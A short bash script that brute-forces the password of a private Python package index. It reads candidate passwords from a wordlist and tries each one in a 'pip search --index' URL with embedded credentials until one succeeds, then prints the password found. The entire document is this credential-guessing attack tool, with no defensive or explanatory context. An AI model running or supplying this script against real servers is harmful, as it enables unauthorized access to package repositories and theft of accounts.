#!/bin/bash
serverip=$1
username=$2
while read F ; do
        echo "Trying $F"
        pip search --index http://$username:$F@$serverip e 2>/dev/null
    if [ $? -eq 0 ] ; then
        echo "Pwd found: $F"
        break
    fi
done < $3